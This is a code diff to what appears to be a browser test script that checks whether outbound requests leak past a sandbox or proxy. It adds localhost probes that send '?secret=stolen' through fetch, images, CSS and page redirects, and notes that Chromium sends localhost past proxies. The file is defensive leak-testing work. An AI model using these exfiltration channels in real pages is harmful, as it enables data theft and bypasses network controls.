@@ -12,6 +12,8 @@
   const host = (name) => `v-${name}.leak.test`;
   const url = (name, scheme = 'http', port = PORT) => `${scheme}://${host(name)}:${port}/${name}?secret=stolen`;
   const ipUrl = (name) => `http://127.0.0.1:${PORT}/ip-${name}?secret=stolen`;
+  // Loopback by name: Chromium treats it like 127.0.0.1 and sends it past proxies by default.
+  const localUrl = (name) => `http://localhost:${PORT}/localhost-${name}?secret=stolen`;
   const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
   const add = (tag, attrs, parent = document.body) => {
     const e = document.createElement(tag);
@@ -33,6 +35,7 @@
   // Requests made directly by script.
   await attempt('fetch', () => fetch(url('fetch')).then((r) => r.status));
   await attempt('fetch-ip', () => fetch(ipUrl('fetch')).then((r) => r.status));
+  await attempt('fetch-localhost', () => fetch(localUrl('fetch')).then((r) => r.status));
   await attempt('fetch-no-cors', () => fetch(url('fetch-no-cors'), { mode: 'no-cors' }).then((r) => r.type));
   await attempt('fetch-post', () => fetch(url('fetch-post'), { method: 'POST', body: 'secret=stolen' }).then((r) => r.status));
   await attempt('fetch-https', () => fetch(url('fetch-https', 'https', PORT + 1)).then((r) => r.status));
@@ -71,6 +74,7 @@
   // Requests made by elements.
   await attempt('image', () => { const i = new Image(); const p = loaded(i); i.src = url('image'); return p; });
   await attempt('image-ip', () => { const i = new Image(); const p = loaded(i); i.src = ipUrl('image'); return p; });
+  await attempt('image-localhost', () => { const i = new Image(); const p = loaded(i); i.src = localUrl('image'); return p; });
   await attempt('css-property', () => { document.body.style.backgroundImage = `url(${url('css-property')})`; return 'set'; });
   await attempt('style-element', () => { const s = document.createElement('style'); s.textContent = `body{background:url(${url('style-element')})}`; document.head.appendChild(s); return 'added'; });
   await attempt('stylesheet', () => loaded(add('link', { rel: 'stylesheet', href: url('stylesheet') }, document.head)));
@@ -115,4 +119,6 @@
   location.href = url('location');
   await sleep(1000);
   location.href = ipUrl('location');
+  await sleep(1000);
+  location.href = localUrl('location');
 })();
